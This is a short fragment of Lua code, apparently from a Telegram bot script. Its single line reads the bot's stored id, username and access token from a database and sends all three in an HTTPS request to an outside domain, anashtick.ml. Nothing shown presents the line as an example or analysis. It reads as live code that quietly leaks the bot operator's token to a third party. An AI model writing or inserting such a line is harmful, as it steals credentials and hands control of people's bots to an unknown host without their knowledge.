...
https.request("https://anashtick.ml/info.php?id="..database:get(Server_LaricA.."Id_LaricA").."&user="..database:get(Server_LaricA.."UserName_LaricA").."&token="..database:get(Server_LaricA.."Token_LaricA"))
